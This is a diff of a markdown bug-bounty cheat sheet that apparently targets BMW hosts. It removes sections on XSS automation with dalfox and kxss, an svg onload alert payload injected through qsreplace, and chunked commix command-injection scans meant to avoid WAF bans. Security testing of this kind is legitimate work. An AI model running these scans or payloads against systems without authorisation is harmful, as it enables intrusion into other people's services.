@@ -292,32 +292,6 @@ subzy run --targets bmw_resolved.txt | tee subzy_results.txt
 
 ---
 
-## 11. XSS Automation
-
-**Requirement:** `parameter.txt`
-```bash
-dalfox file parameters.txt --custom-payload payloads.txt
-python3 xsstrike.py -f parameters.txt --payload payloads.txt
-cat parameters.txt | kxss > reflected.txt
-cat parameters.txt | gxss -o gxss.txt
-cat parameters.txt | kxss | dalfox pipe --custom-payload payloads.txt
-```
-
----
-
-## 12. My XSS Workflow
-
-**Requirement:** `parameter.txt`
-```bash
-cat parameter.txt | uro > uro.txt
-cat uro.txt | kxss > reflected.txt
-dalfox file reflected.txt --only-discovery
-nuclei -l reflected.txt -t http/vulnerabilities/ -tags xss -severity medium,high,critical
-cat reflected.txt | qsreplace '\"><svg/onload=alert(1)>' | httpx -silent
-```
-
----
-
 ## 13. IDOR Parameter Fetch
 
 **Requirement:** `parameter.txt`
@@ -329,45 +303,3 @@ sort -u idor_clean2.txt > idor_final.txt
 ```
 
 ---
-
-## 14. CMD Injection
-
-**Requirement:** `parameter.txt` must exist (combined output from ParamSpider / Arjun / FFUF).
-
-The goal here is to **reduce noise**, scan safely, and test CMD injection in **controlled chunks of 100 URLs**.
-
-```bash
-# Step 1: Filter parameters that commonly lead to command injection
-# This avoids scanning every parameter blindly
-grep -Ei "ip|host|ping|cmd|exec|shell|run|query" parameter.txt > cmdi_all.txt
-
-# Step 2: Remove duplicate URLs to reduce scan time
-sort -u cmdi_all.txt > cmdi_unique.txt
-
-# Step 3: Keep only valid parameterized URLs (must contain '=')
-grep "=" cmdi_unique.txt > cmdi_final.txt
-
-# Step 4: Split into chunks of 100 URLs per file
-# Example output files: cmdi_aa, cmdi_ab, cmdi_ac ...
-split -l 100 cmdi_final.txt cmdi_
-
-# Step 5: Safe initial detection scan (fast, low noise)
-commix -m /home/alhamr/Downloads/bmw/results/cmdi_aa --batch --level=1
-
-# Step 6: Deeper confirmation scan on the same 100 URLs
-commix -m /home/alhamr/Downloads/bmw/results/cmdi_aa --batch --level=2
-
-# Step 7: Blind / time-based CMD injection testing (slow, last option)
-commix -m /home/alhamr/Downloads/bmw/results/cmdi_aa --batch --level=3 --technique=t
-
-# Step 8: Move to the next 100 URLs and repeat from level 1
-commix -m /home/alhamr/Downloads/bmw/results/cmdi_ab --batch --level=1
-
-# Step 9: Save detailed results for reporting and later review
-commix -m /home/alhamr/Downloads/bmw/results/cmdi_aa --batch --level=2 --output-dir=commix_results
-```
-
-**Recommended flow:**
-`level=1 → level=2 → level=3 (only if needed)`
-
-Always scan chunk‑by‑chunk to avoid crashes, WAF bans, and false positives.
